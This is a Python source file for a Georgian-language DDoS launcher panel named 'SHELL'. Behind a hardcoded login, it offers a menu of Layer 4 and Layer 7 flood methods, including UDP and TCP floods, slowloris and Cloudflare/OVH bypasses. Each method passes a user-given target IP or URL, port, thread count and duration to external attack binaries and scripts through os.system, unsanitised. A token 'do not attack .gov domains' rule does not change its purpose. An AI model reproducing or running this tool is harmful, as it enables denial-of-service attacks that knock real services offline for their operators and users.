#shell-DDOS
# არ გადოსოთ; .gov/.gob/.edu/.mil დომეინებზე


import socket
import os
import requests
import random
import getpass
import time
import sys
from colorama import Fore, Back, Style


def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

proxys = open('proxies.txt').readlines()
bots = len(proxys)

def ascii_vro():
    clear()
    print(Fore.LIGHTGREEN_EX + f'''
                     ██╗       ██╗███████╗██╗      █████╗  █████╗ ███╗   ███╗███████╗
                     ██║  ██╗  ██║██╔════╝██║     ██╔══██╗██╔══██╗████╗ ████║██╔════╝
                     ╚██╗████╗██╔╝█████╗  ██║     ██║  ╚═╝██║  ██║██╔████╔██║█████╗
                      ████╔═████║ ██╔══╝  ██║     ██║  ██╗██║  ██║██║╚██╔╝██║██╔══╝
                      ╚██╔╝ ╚██╔╝ ███████╗███████╗╚█████╔╝╚█████╔╝██║ ╚═╝ ██║███████╗
                       ╚═╝   ╚═╝  ╚══════╝╚══════╝ ╚════╝  ╚════╝ ╚═╝     ╚═╝╚══════╝
    ''')
    time.sleep(0.5)
    clear()
    print(Fore.RED + f'''
                              ████████╗ █████╗   ████████╗██╗  ██╗███████╗
                              ╚══██╔══╝██╔══██╗  ╚══██╔══╝██║  ██║██╔════╝
                                 ██║   ██║  ██║     ██║   ███████║█████╗
                                 ██║   ██║  ██║     ██║   ██╔══██║██╔══╝
                                 ██║   ╚█████╔╝     ██║   ██║  ██║███████
    ''')
    time.sleep(0.5)
    clear()
    print(Fore.LIGHTYELLOW_EX + f"""
                      ██╗       ██╗ █████╗ ██████╗ ██╗     ██████╗       █████╗ ███████╗
                      ██║  ██╗  ██║██╔══██╗██╔══██╗██║     ██╔══██╗     ██╔══██╗██╔════╝
                      ╚██╗████╗██╔╝██║  ██║██████╔╝██║     ██║  ██║     ██║  ██║█████╗
                       ████╔═████║ ██║  ██║██╔══██╗██║     ██║  ██║     ██║  ██║██╔══╝
                       ╚██╔╝ ╚██╔╝ ╚█████╔╝██║  ██║███████╗██████╔╝     ╚█████╔╝██║
                        ╚═╝   ╚═╝   ╚════╝ ╚═╝  ╚═╝╚══════╝╚═════╝       ╚════╝ ╚═╝
    """)
    time.sleep(0.8)
    clear()

    print(Fore.LIGHTRED_EX + f"""
                                    ██████╗██╗  ██╗███████╗██╗     ██╗
                                   ██╔════╝██║  ██║██╔════╝██║     ██║
                                   ╚█████╗ ███████║█████╗  ██║     ██║
                                    ╚═══██╗██╔══██║██╔══╝  ██║     ██║
                                   ██████╔╝██║  ██║███████╗███████╗███████╗
                                   ╚═════╝ ╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝
    """)
    time.sleep(0.8)
    clear()

def si():
    print(Fore.LIGHTGREEN_EX +'[ SHELL ] | მოგესალმებით SHELL ის DDOS სამყაროში. | Owner: SHELL | უძლიერესი DDOS თული უფასოდ |')
    print("")

def tools():
    clear()
    si()
    print(Fore.LIGHTYELLOW_EX + f'''
                                             ╔═══════════════╗
                                             ║     Tools     ║
                             ╔═══════════════╩══════╦════════╩═══════════════╗
                               geoip                ║  reverse-dns           
                               reverseip            ║  <მალე დაემატება>           
                               subnet-lookup        ║  <მალე დაემატება>        
                               asn-lookup           ║  <მალე დაემატება>       
                               dns-lookup           ║  <მალე დაემატება>       
                             ╚══════════════════════╩════════════════════════╝
''')
    
def rules():
    clear()
    si()
    print(Fore.LIGHTYELLOW_EX + f'''
                                             ╔═══════════════╗
                                             ║     Rules     ║
                             ╔═══════════════╩═══════════════╩═══════════════╗
                               1. Do not attack .gov/.gob/.edu/.mil domains  
                               2. Only attack stress testing servers        
                               3. Don't skid the panel                       
                               4. Give a star to the github repository       
                               5. The creator does not do any harm           
                             ╚═══════════════════════════════════════════════╝
''')

    
def layer7():
    clear()
    si()
    print(Fore.LIGHTYELLOW_EX + f'''
                                             ╔═══════════════╗
                                             ║    Layer 7    ║
                              ╔══════════════╩════════╦══════╩══════════════╗
                                  http-raw            ║   crash            
                                  http-socket         ║   httpflood         
                                  http-storm          ║   cf-socket         
                                  http-rand           ║   cf-pro            
                                  moverflow           ║   hyper             
                                  cf-bypass           ║   slow              
                                  uambypass           ║   https-spoof      
                                  ovh-raw             ║   ovh-beam          
                              ╚═══════════════════════╩═════════════════════╝
''')

def layer4():
    clear()
    si()
    print(Fore.LIGHTYELLOW_EX +f'''
                                            ╔═══════════════╗
                                            ║    Layer 4    ║
                             ╔══════════════╩════════╦══════╩══════════════╗
                                 destroy             ║   tcp               
                                 nfo-killer          ║   std               
                                 god                 ║   udp         
                                 home                ║   udpbypass              
                                 slowloris           ║   SHELLflux             
                                 stdv2               ║   <მალე დაემატება>  
                             ╚═══════════════════════╩═════════════════════╝
''')


def menu():
    sys.stdout.write(f" \x1b]2;| ქართული უძლიერესი ddos tool | by shell<3 |\x07")
    clear()
    print(Fore.LIGHTGREEN_EX + '     [ SHELL ] | კეთილი იყოს თქვენი მობრძანება SHELL ის DDOS სამყაროში. | ახალი სკრიპტები! | ახალი სამყარო!')
    print("")
    print(Fore.LIGHTYELLOW_EX + """
                    
                                  ██████╗██╗  ██╗███████╗██╗     ██╗  
                                 ██╔════╝██║  ██║██╔════╝██║     ██║
                                 ╚█████╗ ███████║█████╗  ██║     ██║
                                  ╚═══██╗██╔══██║██╔══╝  ██║     ██║
                                 ██████╔╝██║  ██║███████╗███████╗███████╗
                                 ╚═════╝ ╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝ 

                             ╔══════════════════════════════════════════════╗
                                  მოგესალმებით SHELL-ის  DDos სამყაროში!        
                                         საუკეთსო DDos მეთოდი 
                             ╚══════════════════════════════════════════════╝
                                 ╔══════════════════════════════════════╗
                                       https://github.com/shell3301     
                                 ╚══════════════════════════════════════╝
                             ╔══════════════════════════════════════════════╗
                                  ბრძანებების სანახავად აკრიფეთ [help]  
                             ╚══════════════════════════════════════════════╝
""")

def main():
    menu()
    while(True):
        cnc = input(Fore.LIGHTGREEN_EX + '''╔══[DDos@SHell]
╚════>>''')
        if cnc == "layer7" or cnc == "LAYER7" or cnc == "L7" or cnc == "l7" or cnc == "1":
            layer7()
        elif cnc == "layer4" or cnc == "LAYER4" or cnc == "L4" or cnc == "l4" or cnc == "4" or cnc == "2":
            layer4()
        elif cnc == "rule" or cnc == "RULES" or cnc == "rules" or cnc == "RULES" or cnc == "RULE34" or cnc == "r" or cnc == "R" or cnc == "3":
            rules()
        elif cnc == "clear" or cnc == "CLEAR" or cnc == "CLS" or cnc == "cls" or cnc == "5":
            main()
        elif cnc == "tools" or cnc == "tool" or cnc == "TOOLS" or cnc == "TOOL" or cnc == "T" or cnc == "t" or cnc == "4":
            tools()


# მეოთხე ლეიერი

        elif "udpbypass" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                os.system(f'./UDPBY {ip} {port}')
            except IndexError:
                print('გამოყენება: udpby <ip> <port>')
                print('მაგალითი: udpby 1.1.1.1 80')

        elif "stdv2" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                os.system(f'./std {ip} {port}')
            except IndexError:
                print('გამოყენება: stdv2 <ip> <port>')
                print('მაგალითი: stdv2 1.1.1.1 80')

        elif "SHELLflux" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                thread = cnc.split()[3]
                os.system(f'./SHELLflux {ip} {port} {thread} 0')
            except IndexError:
                print('გამოყენება: SHELLflux <ip> <port> <threads>')
                print('მაგალითი: SHELLflux 1.1.1.1 80 250')

        elif "slowloris" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                os.system(f'./slowloris {ip} {port}')
            except IndexError:
                print('გამოყენება: slowloris <ip> <port>')
                print('მაგალითი: slowloris 1.1.1.1 80')

        elif "goddos" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                time = cnc.split()[3]
                os.system(f'perl goddos.pl {ip} {port} 65500 {time}')
            except IndexError:
                print('გამოყენება: goddos <ip> <port> <time>')
                print('მაგალითი: goddos 1.1.1.1 80 60')


        elif "std" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                os.system(f'./STD-NOSPOOF {ip} {port}')
            except IndexError:
                print('გამოყენება: std <ip> <port>')
                print('მაგალითი: std 1.1.1.1 80')

        elif "home" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                psize = cnc.split()[3]
                time = cnc.split()[4]
                os.system(f'perl home.pl {ip} {port} {psize} {time}')
            except IndexError:
                print('გამოყენება: home <ip> <port> <packet_size> <time>')
                print('მაგალითი: home 1.1.1.1 80 65500 60')

        elif "udp" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                os.system(f'python2 udp.py {ip} {port} 0 0')
            except IndexError:
                print('გამოყენება: udp <ip> <port>')
                print('მაგალითი: udp 1.1.1.1 80')

        elif "nfo-killer" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                threads = cnc.split()[3]
                time = cnc.split()[4]
                os.system(f'./nfo-killer {ip} {port} {threads} -1 {time}')
            except IndexError:
                print('გამოყენება: nfo-killer <ip> <port> <threads> <time>')
                print('მაგალითი: nfo-killer 1.1.1.1 80 850 60')

        elif "ovh-raw" in cnc:
            try:
                method = cnc.split()[1]
                ip = cnc.split()[2]
                port = cnc.split()[3]
                time = cnc.split()[4]
                conns = cnc.split()[5]
                os.system(f'./ovh-raw {method} {ip} {port} {time} {conns}')
            except IndexError:
                print('გამოყენება: ovh-raw METHODS[GET/POST/HEAD] <ip> <port> <time> <connections>')
                print('მაგალითი: ovh-raw GET 1.1.1.1 80 60 8500')

        elif "tcp" in cnc:
            try:
                method = cnc.split()[1]
                ip = cnc.split()[2]
                port = cnc.split()[3]
                time = cnc.split()[4]
                conns = cnc.split()[5]
                os.system(f'./100UP-TCP {method} {ip} {port} {time} {conns}')
            except IndexError:
                print('გამოყენება: tcp METHODS[GET/POST/HEAD] <ip> <port> <time> <connections>')
                print('მაგალითი: tcp GET 1.1.1.1 80 60 8500')
        
        
        elif "flux" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                thread = cnc.split()[3]
                os.system(f'./flux {ip} {port} {thread} 0')
            except IndexError:
                print('Usage: flux <ip> <port> <threads>')
                print('Example: flux 1.1.1.1 80 250')
        
        elif "destroy" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                time = cnc.split()[3]
                os.system(f'perl destroy.pl {ip} {port} 65500 {time}')
            except IndexError:
                print('Usage: destroy <ip> <port> <time>')
                print('Example: destroy 1.1.1.1 80 60')





#მეთოდები

        elif "shellstress" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                mode = cnc.split()[3]
                conn = cnc.split()[4]
                time = cnc.split()[5]
                out = cnc.split()[6]
                os.system(f'go run shellstress.go {ip} {port} {mode} {conn} {time} {out}')
            except IndexError:
                print('გამოყენება: stress <ip> <port> <mode> <connection> <seconds> <timeout>')
                print('რეჟიმი:[1] TCP')
                print('       [2] UDP')
                print('       [3] HTTP')
                print('მაგალითი: stress 1.1.1.1 80 3 1250 60 5')
                

# მეშვიდე ლეიერი
 
        elif "ovh-beam" in cnc:
            try:
                method = cnc.split()[1]
                ip = cnc.split()[2]
                port = cnc.split()[3]
                time = cnc.split()[4] 
                os.system(f'./OVH-BEAM {method} {ip} {port} {time} 1024')
            except IndexError:
                print('გამოყენება: ovh-beam <GET/HEAD/POST/PUT> <ip> <port> <time>')
                print('მაგალითი: ovh-beam GET 51.38.92.223 80 60')
    
        elif "https-spoof" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                thread = cnc.split()[3]
                os.system(f'python3 https-spoof.py {url} {time} {thread}')
            except IndexError:
                print('გამოყენება: https-spoof <url> <time> <threads>')
                print('მაგალითი: https-spoof http://vailon.com 60 500')
    
        elif "slow" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                os.system(f'node slow.js {url} {time}')
            except IndexError:
                print('გამოყენება: slow <url> <time>')
                print('მაგალითი: slow http://vailon.com 60')
    
        elif "hyper" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                os.system(f'node hyper.js {url} {time}')
            except IndexError:
                print('გამოყენება: hyper <url> <time>')
                print('მაგალითი: hyper http://vailon.com 60')
                
        elif "cf-socket" in cnc:
            try:
                os.system(f'python3 bypass.py')
            except IndexError:
                print('cf-socket')
    
        elif "cf-pro" in cnc:
            try:
                os.system(f'python3 cf-pro.py')
            except IndexError:
                print('cf-pro')
        elif "cf-socket" in cnc:
            try:
                os.system(f'python3 bypass.py')
            except IndexError:
                print('cf-socket')
        
        elif "http-socket" in cnc:
            try:
                url = cnc.split()[1]
                per = cnc.split()[2]
                time = cnc.split()[3]
                os.system(f'node HTTP-SOCKET {url} {per} {time}')
            except IndexError:
                print('გამოყენება: http-socket <url> <per> <time>')
                print('მაგალითი: http-socket http://example.com 5000 60')

        elif "http-raw" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                os.system(f'node HTTP-RAW {url} {time}')
            except IndexError:
                print('გამოყენება: http-raw <url> <time>')
                print('მაგალითი: http-raw http://example.com 60')

        elif "http-requests" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                os.system(f'node HTTP-REQUESTS {url} {time}')
            except IndexError:
                print('გამოყენება: http-requests <url> <time>')
                print('მაგალითი: http-requests http://example.org 60')

        elif "http-rand" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                os.system(f'node HTTP-RAND.js {url} {time}')
            except IndexError:
                print('გამოყენება: http-rand <url> <time>')
                print('მაგალითი: http-rand http://vailon.com/ 60')

        elif "overflow" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                thread = cnc.split()[3]
                os.system(f'./OVERFLOW {ip} {port} {thread}')
            except IndexError:
                print('გამოყენება: overflow <ip> <port> <threads>')
                print('მაგალითი: overflow 1.1.1.1 80 5000')

        elif "cf-bypass" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                thread = cnc.split()[3]
                os.system(f'node cf.js {url} {time} {thread}')
            except IndexError:
                print('გამოყენება: cf-bypass <url> <time> <threads>')
                print('მაგალითი: cf-bypass http://example.com 60 1250')

        elif "uambypass" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                per = cnc.split()[3]
                os.system(f'node uambypass.js {url} {time} {per} http.txt')
            except IndexError:
                print('გამოყენება: uambypass <url> <time> <req_per_ip>')
                print('მაგალითი: uambypass http://example.com 60 1250')

        elif "crash" in cnc:
            try:
                url = cnc.split()[1]
                method = cnc.split()[2]
                os.system(f'go run Hulk.go -site {url} -data {method}')
            except IndexError:
                print('გამოყენება: crash <url> METHODS<GET/POST>')
                print('მაგალითი: crash http://example.com GET')

        elif "httpflood" in cnc:
            try:
                url = cnc.split()[1]
                thread = cnc.split()[2]
                method = cnc.split()[3]
                time = cnc.split()[4]
                os.system(f'go run httpflood.go {url} {thread} {method} {time} nil')
            except IndexError:
                print('გამოყენება: httpflood <url> <threads> METHODS<GET/POST> <time>')
                print('მაგალითი: httpflood http://example.com 15000 get 60')

        elif "httpget" in cnc:
            try:
                url = cnc.split()[1]
                os.system(f'./httpget {url} 10000 50 100')
            except IndexError:
                print('გამოყენება: httpget <url>')
                print('მაგალითი: httpget http://example.com')



        
                
#  ხელსაწყოები

        elif "geoip" in cnc:
            try:
                ip = cnc.split()[1]
                try:
                    r = requests.get(f'https://api.hackertarget.com/geoip/?q={ip}')
                    print(r.text)
                except:
                    print("[ API Error :( ]")
            except IndexError:
                print('გამოყენება: geoip <ip>')
                print('მაგალითი: geoip 1.1.1.1')

        elif "reverseip" in cnc:
            try:
                ip = cnc.split()[1]
                try:
                    r = requests.get(f'https://api.hackertarget.com/reverseiplookup/?q={ip}')
                    print(r.text)
                except:
                    print("[ API Error :( ]")
            except IndexError:
                print('გამოყენება: reverseip <ip>')
                print('მაგალითი: reverseip 1.1.1.1')

        elif "subnet-lookup" in cnc:
            try:
                ip = cnc.split()[1]
                try:
                    r = requests.get(f'https://api.hackertarget.com/subnetcalc/?q={ip}')
                    print(r.text)
                except:
                    print("[ API Error :( ]")
            except IndexError:
                print('გამოყენება: subnet-lookup <cdr/ip + netmask>')
                print('მაგალითი: subnet-lookup 192.168.1.0/24')

        elif "asn-lookup" in cnc:
            try:
                ip = cnc.split()[1]
                try:
                    r = requests.get(f'https://api.hackertarget.com/aslookup/?q={ip}')
                    print(r.text)
                except:
                    print("[ API Error :( ]")
            except IndexError:
                print('გამოყენება: asn-lookup <ip/asn>')
                print('მაგალითი: asn-lookup AS15169')

        elif "dns-lookup" in cnc:
            try:
                ip = cnc.split()[1]
                try:
                    r = requests.get(f'https://api.hackertarget.com/dnslookup/?q={ip}')
                    print(r.text)
                except:
                    print("[ API Error :( ]")
            except IndexError:
                print('გამოყენება: dns-lookup <dns>')
                print('მაგალითი: dns-lookup google.com')

        elif "reverse-dns" in cnc:
            try:
                ip = cnc.split()[1]
                try:
                    r = requests.get(f'https://api.hackertarget.com/reversedns/?q={ip}')
                    print(r.text)
                except:
                    print("[ API Error :( ]")
            except IndexError:
                print('გამოყენება: reverse-dns <ip/domain>')
                print('მაგალითი: reverse-dns 8.8.8.8')                

        elif "cloudflare-lag" in cnc:
            print('Method "CLOUDFLARE-LAG" not enabled')

        
            
            
        elif "help" in cnc:
            print(Fore.LIGHTRED_EX + f'''

                                 ╔═══════════════════════════════════════╗
                                    [1] LAYER7  ►  Layer 7 შეტევის ნახვა
                                    [2] LAYER4  ►  Layer 4 შეტევის ნახვა
                                    [3] RULES   ►  წესების პანელი
                                    [4] TOOLS   ►  ხელსაწყოების ნახვა
                                    [5] CLEAR   ►  ტერმინალის გასუფთავება
                                 ╚═══════════════════════════════════════╝
                                  
                                  ''')

        else:
            try:
                cmmnd = cnc.split()[0]
                print("Command: [ " + cmmnd + " ] Not Found!")
            except IndexError:
                pass


def login():
    clear()
usernames = ("aleko22", "admin", "GST", "gst22")
passwords = ("aleko22", "admin", "GST", "gst22")
max_attemp = 5

def validator(username, password):
    isValid = False
    if username in usernames and password in passwords:
        if (list(usernames).index(username) == list(passwords).index(password)):
            isValid = True
    return isValid
    
attemps = 0
while True:
    username = input("</> მომხმარებელი: ")
    password = getpass.getpass('</> პაროლი: ')
    if validator(username, password):
        print("წვდომა მინიჭებულია")
        print("</> მოგესალმებით SHELL-ის DDos სამყაროში!")
        time.sleep(0.3)
        ascii_vro()
        main()
        break
    
    
    else:
        attemps+=1
        if attemps >= max_attemp:
            print(Fore.RED + "გადააჭარბა მაქსიმალურ მცდელობებს. გაა*ვი აქედან:)")
            break
        
        print(Fore.YELLOW + "პაროლი არასწორია! დაელოდე 10 წამი")
        time.sleep(10)


    login()